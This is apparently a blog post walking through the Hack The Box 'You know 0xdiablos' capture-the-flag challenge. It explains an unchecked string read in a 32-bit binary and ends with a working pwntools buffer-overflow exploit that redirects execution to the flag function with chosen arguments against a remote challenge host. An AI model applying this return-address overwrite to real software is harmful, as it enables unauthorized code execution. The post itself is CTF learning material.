---
layout: post
title: Hack the Box rev 0xdiablos
image: /assets/img/HTB-Logo.png
date:   2022-12-12 11:15:01
tags:
- rev
description: Basic rev challenge
categories:
- Hack The Box
---



you know 0xdiablos

this is a program that reads a string without any checks for boundaries:

![](/assets/img/2022-09-16-15-57-06.png)


this is the stack

![](/assets/img/2022-09-16-15-57-22.png)

We need to call the flag function with arguments a1 and a2 set by us
ROPgadget --binary vuln
W're going to use:
0x08049389 : pop esi ; pop edi ; pop ebp ; ret
push the arguments on the stack as follows


![](/assets/img/2022-09-16-15-33-19.png)


The flag:
![](/assets/img/2022-09-16-15-33-06.png)

We need to push 3 values to the stack 1 which would be the return address and two which are the a1 and a2 arguments.



The address of the flag function is 0x80491E2. 

Exploit:
```
from pwn import *
sender=b'a'*180+2*4*b'a'+p32(0x80491E2)+b'retu'+p32(0xDEADBEEF)+p32(0xC0DED00D)
#io = process("./vuln")
io=remote('178.62.82.68',30544 )
#io=gdb.debug("./vuln",'break main  ')
#sleep(3)
io.sendline(sender)
io.interactive()
```
